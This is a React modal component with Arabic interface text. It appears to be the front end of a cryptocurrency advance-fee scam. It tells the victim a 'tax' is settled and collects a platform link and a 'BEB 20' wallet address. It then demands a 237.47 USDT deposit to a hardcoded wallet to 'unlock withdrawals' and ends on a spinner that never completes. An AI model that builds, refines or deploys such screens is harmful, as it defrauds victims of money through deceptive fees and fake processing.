
import React, { useState } from 'react';
import { Copy, CheckCircle2, Loader2, ArrowRight, ShieldCheck, Wallet, ExternalLink } from 'lucide-react';

interface ActionModalProps {
  userName: string;
}

export const ActionModal: React.FC<ActionModalProps> = ({ userName }) => {
  const [step, setStep] = useState(1);
  const [copied, setCopied] = useState(false);
  const [platformLink, setPlatformLink] = useState('');
  const [walletAddress, setWalletAddress] = useState('');

  const depositAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";

  const handleCopy = () => {
    navigator.clipboard.writeText(depositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const nextStep = () => setStep(prev => prev + 1);

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/30 backdrop-blur-[1px]">
      {/* Centered dialog with translate-y-12 to keep it slightly lower than absolute center */}
      <div className="bg-white rounded-[2rem] w-full max-w-sm overflow-hidden shadow-2xl border border-gray-100 animate-in fade-in zoom-in duration-300 transform translate-y-12">
        
        {/* Progress Bar */}
        <div className="h-1.5 w-full bg-gray-100 flex">
          <div 
            className="h-full bg-[#FF2D55] transition-all duration-500 ease-out" 
            style={{ width: `${(step / 4) * 100}%` }}
          />
        </div>

        <div className="p-8 flex flex-col items-center">
          
          {step === 1 && (
            <div className="space-y-6 w-full animate-in slide-in-from-right duration-300 text-right dir-rtl">
              <div className="flex justify-center mb-2">
                <div className="bg-pink-50 p-4 rounded-full">
                  <ShieldCheck className="text-[#FF2D55]" size={32} />
                </div>
              </div>
              
              <div className="space-y-2">
                <h3 className="text-xl font-bold text-gray-900 leading-tight">
                  أهلاً بك <span className="text-[#FF2D55]">{userName}</span>
                </h3>
                <p className="text-gray-500 text-sm leading-relaxed">
                  تم حل أمر الضريبة بنجاح. يرجى المتابعة لإعداد قناة السحب الخاصة بك.
                </p>
              </div>

              <div className="bg-gray-50 p-4 rounded-2xl border border-gray-100">
                <p className="text-[13px] text-gray-700 font-medium mb-3">
                  ضع رابط منصة <span className="font-bold text-black">mini pro</span> لقسم الإيداع حصراً:
                </p>
                <div className="relative">
                  <input 
                    type="text" 
                    value={platformLink}
                    onChange={(e) => setPlatformLink(e.target.value)}
                    placeholder="https://..."
                    className="w-full bg-white border border-gray-200 rounded-xl pl-4 pr-10 py-3 text-left focus:outline-none focus:ring-2 focus:ring-[#FF2D55]/10 focus:border-[#FF2D55] transition-all text-sm"
                  />
                  <ExternalLink size={16} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" />
                </div>
              </div>

              <button 
                onClick={nextStep}
                disabled={!platformLink}
                className="w-full bg-black text-white font-bold py-4 rounded-xl flex items-center justify-center gap-3 hover:bg-gray-800 transition-all active:scale-[0.98] disabled:opacity-30"
              >
                <span>التالي</span>
                <ArrowRight size={18} className="rotate-180" />
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-6 w-full animate-in slide-in-from-right duration-300 text-right dir-rtl">
              <div className="flex justify-center mb-2">
                <div className="bg-blue-50 p-4 rounded-full">
                  <Wallet className="text-blue-500" size={32} />
                </div>
              </div>

              <div className="space-y-2">
                <h3 className="text-xl font-bold text-gray-900 leading-tight">رابط المحفظة</h3>
                <p className="text-gray-500 text-sm leading-relaxed">
                  الرجاء إدخال رابط محفظة <span className="font-bold text-black">BEB 20</span> الخاصة بك للمتابعة وتفعيل السحب.
                </p>
              </div>

              <div className="space-y-2">
                <input 
                  type="text" 
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="أدخل عنوان BEB 20 هنا..."
                  className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 focus:outline-none focus:ring-2 focus:ring-blue-500/10 focus:border-blue-500 transition-all text-black font-mono text-xs text-center"
                />
              </div>

              <button 
                onClick={nextStep}
                disabled={!walletAddress}
                className="w-full bg-black text-white font-bold py-4 rounded-xl flex items-center justify-center gap-3 hover:bg-gray-800 transition-all active:scale-[0.98] disabled:opacity-30"
              >
                <span>التالي</span>
                <ArrowRight size={18} className="rotate-180" />
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-5 w-full animate-in slide-in-from-right duration-300 text-right dir-rtl">
              <div className="bg-pink-50/50 p-5 rounded-2xl border border-pink-100">
                <h4 className="text-[#FF2D55] font-bold text-lg mb-2">الخطوة الأخيرة</h4>
                <p className="text-gray-800 text-[13px] leading-relaxed">
                   بقي أمر إيداع مبلغ <span className="font-black text-black">237.47 USDT BEB 20</span> لفتح قناة السحب. 
                </p>
                <div className="h-px bg-pink-100 my-3" />
                <p className="text-[11px] text-gray-500 leading-relaxed italic">
                  هذه الضريبة المنخفضة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro. يمكنك السحب فوراً عند إنهاء الإيداع.
                </p>
              </div>

              <div className="bg-gray-900 p-5 rounded-2xl relative overflow-hidden">
                <p className="text-[10px] font-bold text-gray-500 mb-2 uppercase tracking-widest">عنوان الإيداع المخصص</p>
                <div className="flex items-center gap-3">
                  <span className="text-[11px] font-mono text-white/90 truncate flex-1 tracking-tight">{depositAddress}</span>
                  <button onClick={handleCopy} className="p-2.5 bg-white/10 hover:bg-white/20 rounded-lg transition-colors">
                    {copied ? <CheckCircle2 size={16} className="text-green-400" /> : <Copy size={16} className="text-white/60" />}
                  </button>
                </div>
                {/* Visual Accent */}
                <div className="absolute top-0 right-0 w-16 h-16 bg-[#FF2D55]/10 blur-2xl rounded-full" />
              </div>

              <button 
                onClick={nextStep}
                className="w-full bg-[#FF2D55] text-white font-bold py-4 rounded-xl shadow-xl shadow-pink-500/20 active:scale-[0.97] transition-all text-lg"
              >
                تم الإيداع
              </button>
            </div>
          )}

          {step === 4 && (
            <div className="py-10 flex flex-col items-center gap-8 animate-in fade-in duration-700">
              <div className="relative flex items-center justify-center">
                <div className="w-24 h-24 border-4 border-gray-100 rounded-full" />
                <Loader2 className="absolute text-[#FF2D55] animate-spin" size={56} strokeWidth={1.5} />
                <div className="absolute w-3 h-3 bg-[#FF2D55] rounded-full animate-ping" />
              </div>
              
              <div className="text-center space-y-2 dir-rtl">
                <h3 className="text-xl font-bold text-gray-900">الرجاء الانتظار...</h3>
                <p className="text-gray-500 text-sm font-medium">
                  جاري التأكد من عملية الإيداع ومزامنة البيانات مع نظام السحب. قد يستغرق ذلك بضع لحظات.
                </p>
              </div>
            </div>
          )}

        </div>
      </div>
      <style>{`
        .dir-rtl { direction: rtl; }
      `}</style>
    </div>
  );
};
